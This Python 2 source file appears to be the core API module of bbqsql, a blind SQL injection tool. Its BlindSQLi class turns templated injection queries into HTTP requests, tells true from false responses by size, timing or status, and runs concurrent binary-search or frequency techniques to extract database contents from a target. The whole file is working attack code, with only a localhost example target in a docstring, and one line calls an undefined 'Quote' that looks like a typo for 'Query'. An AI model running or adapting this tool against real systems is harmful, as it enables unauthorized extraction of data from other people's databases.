from .query import Query
from .pretty_print import PrettyTable
from .technique import *
from .requester import *

from bbqsql import utilities
from bbqsql import settings

from urllib import quote
from traceback import print_exc
import re

__all__ = ['Query','BlindSQLi']

techniques = {'binary_search':BooleanBlindTechnique,'frequency_search':FrequencyTechnique}


#mappings from response attributes to Requester subclasses
response_attributes = {\
    'status_code':Requester,\
    'url':Requester,\
    'time':LooseNumericRequester,\
    'size':LooseNumericRequester,\
    'text':LooseTextRequester,\
    'content':LooseTextRequester,\
    'encoding':LooseTextRequester,\
    'cookies':LooseTextRequester,\
    'headers':LooseTextRequester,\
    'history':LooseTextRequester
}

class BlindSQLi:
    '''
    This object allows you to do a blind sql injection attack. 
    '''
    def __init__(self,\
        query               = "row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}&sleep=${sleep:0}",\
        comparison_attr     = "size",
        technique           = "binary_search",\
        concurrency         = 50,**kwargs):
        '''
        Initialize the BlindSQLi with query, comparison_attr, technique, and any Requests
        parameters you would like (url,method,headers,cookies). For more details on these,
        check out the documentation for the Requests library at https://github.com/kennethreitz/requests .

            :param query      
                This should be a bbqsql.Query object that specified arguments such as 
                row_index, char_index, character_value, comparator, sleep and so on. 
                Every time a request is made, this Query gets rendered and put into 
                the request. You can specify where it gets put into the request by
                making one or more of the request parameters a Query object with 
                an argument called "injection". For example, if the SQL injection
                is in the query string of a HTTP GET request, you might set the following:

                url     = bbqsql.Query('http://127.0.0.1:8090/error?${injection}')
                query   = bbqsql.Query("row_index=${row_index:1}&character_index=${char_index:1}\\
                          &character_value=${char_val:0}&comparator=${comparator:>}&sleep=${sleep:0}",encoder=quote)
                bsqli   = bbqsql.BlindSQLi(query=query,url=url)
            
            :param comparison_attribute
                This specifies what part of the HTTP response we are looking at to determing
                if your request was evaluated as true or as false. This can be any of the
                following response attributes:
                    -status_code
                    -url
                    -time
                    -size
                    -text
                    -content
                    -encoding
                    -cookies
                    -headers
                    -history
            
            :param technique 
                This specifies what method we will use for doing the blind SQLi. The available options
                are 'binary_search' and 'frequency_search'.

            :param concurrency
                This is the number of eventlets (evented threads) to use for our requests. This will
                rate limit our attack and prevent us from DOSing the server. This should be set close
                to the number of worker threads on the server.

            :param method:          method for the new :class:`Request` object.
            :param url:             URL for the new :class:`Request` object.
            :param params:          (optional) Dictionary or bytes to be sent in the query string for the :class:`Request`.
            :param data:            (optional) Dictionary or bytes to send in the body of the :class:`Request`.
            :param headers:         (optional) Dictionary of HTTP Headers to send with the :class:`Request`.
            :param cookies:         (optional) Dict or CookieJar object to send with the :class:`Request`.
            :param files:           (optional) Dictionary of 'name': file-like-objects (or {'name': ('filename', fileobj)}) for multipart encoding upload.
            :param auth:            (optional) Auth tuple to enable Basic/Digest/Custom HTTP Auth.
            :param allow_redirects: (optional) Boolean. Set to True if POST/PUT/DELETE redirect following is allowed.
            :param proxies:         (optional) Dictionary mapping protocol to the URL of the proxy.
            :param verify:          (optional) if ``True``, the SSL cert will be verified. A CA_BUNDLE path can also be provided.
        '''

        self.concurrency = concurrency
        self.error = False

        try:
            self.technique_type = techniques[technique]
        except KeyError:
            raise Exception("You are trying to use the %s technique, which is not a valid technique. Your options are %s" % (technique,repr(techniques.keys())))

        try:
            requester_type = response_attributes[comparison_attr]
        except KeyError:
            print "You tried to use a comparison_attr that isn't supported. Check the docs for a list"
            quit()

        # convert query string to Query
        self.query = Query(query)

        # Convert a string or dict to Query if it matches the necessary syntax.
        for key in kwargs:
            if type(kwargs[key]) == str and re.match(u'.*\$\{.+\}.*',kwargs[key]):
                kwargs[key] = Query(kwargs[key],encoder=quote)
            
            elif type(kwargs[key]) == dict:
                for k in kwargs[key]:
                    if type(k) == str and re.match(u'\$\{.+\}',k):
                        kwargs[key][Query(k,encoder=quote)] = kwargs[key][k]
                        del(kwargs[key][k])
                    if type(kwargs[key][k]) == str and re.match(u'\$\{.+\}',kwargs[key][k]):
                        kwargs[key][k] = Quote(kwargs[key][k],encoder=quote)

        #build a Requester object. You can pass this any args that you would pass to requests.Request
        self.requester = requester_type(comparison_attr=comparison_attr, **kwargs)

        #the queries default options should evaluate to True in whatever application we are testing. If we flip the comparator it should evauluate to false. 
        #here, we figure out what the opposite comparator is.
        opp_cmp = settings.OPPOSITE_COMPARATORS[self.query.get_option('comparator')]

        #set all the indicies back to 0
        self.query.set_option('char_index','1')
        self.query.set_option('row_index','0')

        print "\n"*100
        try:
            #setup some base values
            #true
            for i in xrange(settings.TRUTH_BASE_REQUESTS):
                self.requester.make_request(value=self.query.render(),case='true',rval=True,debug=(i==settings.TRUTH_BASE_REQUESTS-1))

            #false
            self.query.set_option('comparator',opp_cmp)
            for i in xrange(settings.TRUTH_BASE_REQUESTS):
                self.requester.make_request(value=self.query.render(),case='false',rval=False,debug=(i==settings.TRUTH_BASE_REQUESTS-1))
        except utilities.TrueFalseRangeOverlap:
            self.error = "The response values for true and false are overlapping. Check your configuration.\n"
            self.error += "here are the cases we have collected:\n"
            self.error += str(self.requester.cases)
            
        '''
        #error
        self.query.set_option('char_index','1000')
        for i in xrange(settings.TRUTH_BASE_REQUESTS):
            self.requester.make_request(value=self.query.render(),case='error',rval=False,debug=(i==settings.TRUTH_BASE_REQUESTS-1))
        '''

    @utilities.debug 
    def run(self):
        '''
        Run the BlindSQLi attack, returning the retreived results.
        '''
        
        # DEBUGGING
        print "lib.api.BlindSQLi.run"

        try:
            #build our technique
            if not settings.QUIET and not settings.PRETTY_PRINT: print "setting up technique"
            tech = self.technique_type(requester=self.requester,query=self.query)
            
            if settings.PRETTY_PRINT and not settings.QUIET:
                #setup a PrettyTable for curses like printing
                pretty_table = PrettyTable(get_table_callback=tech.get_results,get_status_callback=tech.get_status,update=settings.PRETTY_PRINT_FREQUENCY)
            
            #run our technique
            if not settings.QUIET and not settings.PRETTY_PRINT: print "starting technique"
            techgl = tech.run(concurrency=self.concurrency,row_len=5)

            if settings.PRETTY_PRINT and not settings.QUIET:
                #start printing the tables
                pretty_table.start()

            #wait for the technique to finish
            techgl.join()

            if not settings.QUIET and not settings.PRETTY_PRINT: print "technique finished"

            if settings.PRETTY_PRINT and not settings.QUIET:
                #kill the pretty tables
                pretty_table.die()
            
            results = tech.get_results()

            if not settings.QUIET and not settings.PRETTY_PRINT:
                print results

            return results

        except KeyboardInterrupt:            
            print "stopping attack"
            # going to try to retreive the partial results. this could go badly
            results = tech.get_results()
            return results
